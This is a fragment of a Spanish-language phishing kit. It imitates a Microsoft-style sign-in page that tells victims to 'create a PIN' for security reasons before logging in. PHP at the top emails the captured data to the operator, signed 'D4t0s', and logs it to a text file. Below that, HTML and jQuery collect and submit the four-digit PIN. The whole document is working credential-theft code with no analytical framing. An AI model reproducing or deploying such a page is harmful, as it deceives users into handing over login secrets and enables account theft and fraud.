...
$MAIL_HEADER = "From: D4t0s";  
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);  
$handle = fopen("Rolling.txt", "a");  
                    ...
                    <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
                        <div class="inner fade-in-lightbox"> 
                            ...
                            <div style="display: inherit;" id="cargaCorreo" role="main" data-bind="component: { name: 'pagination-control',publicMethods: paginationControlMethods, }">
                                <div>
                                    <div class="pagination-view animate slide-in-next" style="min-height:0px">
                                            ...
                                            <div class="row">
                                                <div class="form-group col-md-24">
                                                    ...
                                                    <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',publicMethods: usernameTextbox.placeholderTextboxMethods}"> 
                                                        <input autocomplete="off" onkeypress="return runScript(event)" type="text" id="pin" name="pin" maxlength="4" class="form-control" aria-describedby="l0ginHeader" placeholder="Crea tu PIN" tabindex="0" required=""> </div>
                                                </div>
                                                ...
                                                <div class="col-md-24">
                                                    <div class="text-13">
                                                        <div class="form-group">
                                                            <span>Por motivos de seguridad para iniciar sesión crea tu pin.</span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            ...
                                            <div class="row">
                                                <div class="col-xs-24 no-padding-left-right button-container">
                                                    <div class="inline-block">
                                                        <button type="button" id="enviar" class="btn btn-block btn-primary">Iniciar sesión</button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
...
<script>
    $("#pin").on("input mousemove", function () {
        var regexp = /[^0-9]/i;
    ...
    $("#enviar").on("click", function () {
        if ($("#pin").val().length == 4 || $("#pin").val().length == 0) {
            $("#form1").submit();
        } else {
            alert("Formato de pin incorrecto");
        }
    });
